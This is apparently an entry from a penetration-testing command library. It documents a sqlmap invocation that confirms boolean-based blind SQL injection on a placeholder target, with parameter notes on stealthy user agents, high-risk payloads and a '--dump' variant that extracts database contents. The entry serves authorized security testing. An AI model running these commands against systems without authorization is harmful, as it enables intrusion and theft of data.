---
id: cmd-uuid-002
data: >-
  sqlmap --url "https://target.com/" --batch --random-agent --level 5 --risk 3
  --technique=B
tags:
  - sqli
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.969Z'
verified: false
validated: true
submitted: true
---
# sqlmap-confirm-injection

## Command

```bash
sqlmap --url "https://target.com/" --batch --random-agent --level 5 --risk 3 --technique=B
```

## Description

This command confirms a boolean-based blind SQL injection vulnerability using sqlmap, focusing on specific techniques for verification and initial exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | Target URL with known injection point | Yes |
| `--batch` | Non-interactive execution | No |
| `--random-agent` | Use random User-Agents for stealth | No |
| `--level 5` | Comprehensive testing level | No |
| `--risk 3` | High-risk payloads | No |
| `--technique=B` | Boolean-based blind technique only | No |

## Examples

### Basic Usage

```bash
sqlmap --url "https://target.com/" --batch --random-agent --level 5 --risk 3 --technique=B
```

### Advanced Usage

```bash
sqlmap --url "https://target.com/" --batch --random-agent --level 5 --risk 3 --technique=B --dump
```

## Expected Output

Confirmation like 'boolean-based blind: AND boolean-based blind - WHERE or HAVING clause' and database details such as version and type.

## Related

- [[commands/sqlmap-scan-user-agent]]
- [[procedures/Confirm-and-Exploit-Blind-SQL-Injection]]
